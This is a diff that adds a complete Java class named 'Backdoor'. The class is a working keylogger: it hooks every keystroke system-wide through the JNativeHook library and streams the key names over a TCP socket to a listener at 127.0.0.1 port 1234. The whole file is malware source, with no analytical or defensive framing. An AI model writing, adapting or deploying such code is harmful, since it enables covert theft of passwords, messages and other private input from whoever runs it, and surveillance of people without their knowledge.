@@ -1,0 +1,45 @@
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+import java.io.IOException;
+import java.io.PrintWriter;
+import java.net.InetAddress;
+import java.net.Socket;
+
+public class Backdoor implements NativeKeyListener {
+    private Socket s;
+    private PrintWriter pr;
+
+    public static void main(String[] args) {
+        try {
+            Backdoor bd = new Backdoor();
+            bd.connect();
+            GlobalScreen.registerNativeHook();
+            GlobalScreen.addNativeKeyListener(bd);
+        } catch (NativeHookException | IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void connect() throws IOException {
+        s = new Socket(InetAddress.getByName("127.0.0.1"), 1234);
+        pr = new PrintWriter(s.getOutputStream(), true);
+    }
+
+    @Override
+    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
+        pr.println(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
+    }
+
+    @Override
+    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
+        // Do nothing
+    }
+
+    @Override
+    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
+        // Do nothing
+    }
+}
